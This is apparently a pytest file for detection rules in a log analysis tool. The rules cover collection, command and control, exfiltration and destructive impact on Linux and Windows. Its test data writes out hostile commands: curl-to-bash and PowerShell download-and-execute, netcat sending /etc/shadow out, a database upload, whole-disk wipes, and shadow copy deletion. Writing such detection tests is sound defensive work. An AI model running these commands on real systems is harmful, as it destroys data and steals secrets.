"""Rules for the late attack stages: Collection, Command and Control,
Exfiltration and Impact. Each rule must fire on the attack and stay quiet on
an everyday command that looks similar."""
import json

import pytest

from loghawk.parsers import parse_line
from loghawk.rules import RuleEngine


def fired(lines):
    eng = RuleEngine()
    ids = set()
    for line in lines:
        e = parse_line(line)
        if e:
            ids |= {a.rule_id for a in eng.process(e)}
    return ids


def sudo(cmd, i=0):
    return (f"2026-11-17T10:{i:02d}:00+05:30 web01 sudo[1]: bob : TTY=pts/0 ; PWD=/home/bob ; "
            f"USER=root ; COMMAND={cmd}")


def win(cmd, eid=4688, i=0, **data):
    return json.dumps({"@timestamp": f"2026-11-17T04:{i:02d}:00Z", "EventID": eid, "Computer": "WS07",
                       "EventData": {"CommandLine": cmd, "NewProcessName": "C:\\x.exe", **data}})


@pytest.mark.parametrize("rule, attack, benign", [
    ("LH-L11", "/usr/bin/tar czf /tmp/.c.tgz /home /etc", "/usr/bin/tar xzf /tmp/release.tgz -C /opt/app"),
    ("LH-L12", "/bin/sh -c curl -s http://203.0.113.9/x.sh | bash", "/usr/bin/curl -s https://example.com/health"),
    ("LH-L12", "/usr/bin/wget http://203.0.113.9/k -O /tmp/k", "/usr/bin/wget https://example.com/app.deb -O ./app.deb"),
    ("LH-L13", "/usr/bin/scp /tmp/.c.tgz x@198.51.100.4:/loot/", "/usr/bin/scp /etc/nginx/nginx.conf /root/backup/"),
    ("LH-L13", "/usr/bin/curl -T /tmp/db.sql https://transfer.example/db.sql", "/usr/bin/curl -I https://example.com"),
    ("LH-L13", "/bin/sh -c nc 198.51.100.4 4444 < /etc/shadow", "/usr/bin/nc -zv 10.0.0.5 22"),
    ("LH-L14", "/bin/rm -rf --no-preserve-root /", "/bin/rm -rf /tmp/build-cache"),
    ("LH-L14", "/bin/dd if=/dev/zero of=/dev/sda bs=1M", "/bin/dd if=/dev/zero of=/tmp/swapfile bs=1M count=512"),
    ("LH-L14", "/usr/bin/shred -u /var/lib/mysql/ibdata1", "/usr/bin/sha256sum /var/lib/mysql/ibdata1"),
])
def test_linux_rules(rule, attack, benign):
    assert rule in fired([sudo(attack)])
    assert rule not in fired([sudo(benign)])


@pytest.mark.parametrize("rule, attack, benign", [
    ("LH-WN11", "powershell Compress-Archive -Path C:\\Users\\*\\Documents -DestinationPath C:\\Temp\\d.zip",
     "powershell Expand-Archive C:\\Temp\\tools.zip"),
    ("LH-WN11", "\"C:\\Program Files\\7-Zip\\7z.exe\" a -p1 C:\\Temp\\s.7z \\\\fs01\\finance",
     "\"C:\\Program Files\\7-Zip\\7z.exe\" x C:\\Downloads\\setup.7z"),
    ("LH-WN12", "powershell IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')",
     "powershell Get-Service | Where-Object Status -eq Running"),
    ("LH-WN12", "powershell Invoke-WebRequest http://203.0.113.9/r.exe -OutFile C:\\Users\\Public\\r.exe",
     "powershell Invoke-WebRequest https://intranet/health -UseBasicParsing"),
    ("LH-WN13", "vssadmin.exe Delete Shadows /All /Quiet", "vssadmin.exe List Shadows"),
    ("LH-WN13", "bcdedit /set {default} recoveryenabled No", "bcdedit /enum"),
    ("LH-WN13", "wmic shadowcopy delete", "wmic os get caption"),
])
def test_windows_rules(rule, attack, benign):
    assert rule in fired([win(attack)])
    assert rule not in fired([win(benign)])


def test_mass_account_deletion():
    deletes = [win("", eid=4726, i=i, TargetUserName=f"user{i}") for i in range(5)]
    assert "LH-WN14" in fired(deletes)
    assert "LH-WN14" not in fired(deletes[:2])


def web(size, url="/backup/site.tar.gz", status=200):
    return (f'198.51.100.4 - - [17/Nov/2026:10:00:00 +0530] "GET {url} HTTP/1.1" {status} {size} "-" "curl/8.5"')


def test_large_download():
    assert "LH-W08" in fired([web(2_147_483_648)])
    assert "LH-W08" not in fired([web(48_000_000, "/videos/intro.mp4")])
    assert "LH-W08" not in fired([web(2_147_483_648, status=404)])


def ufw(port, i, action="ALLOW"):
    return (f"2026-11-17T10:00:{i:02d}+05:30 gw01 kernel: [UFW {action}] IN= OUT=eth0 SRC=10.10.3.13 "
            f"DST=198.51.100.66 LEN=60 PROTO=TCP SPT={40000 + i} DPT={port} SYN")


def test_c2_ports():
    assert "LH-F03" in fired([ufw(4444, i) for i in range(3)])
    assert "LH-F03" not in fired([ufw(443, i) for i in range(10)])
    assert "LH-F03" not in fired([ufw(4444, i, "BLOCK") for i in range(10)])  # blocked is fine
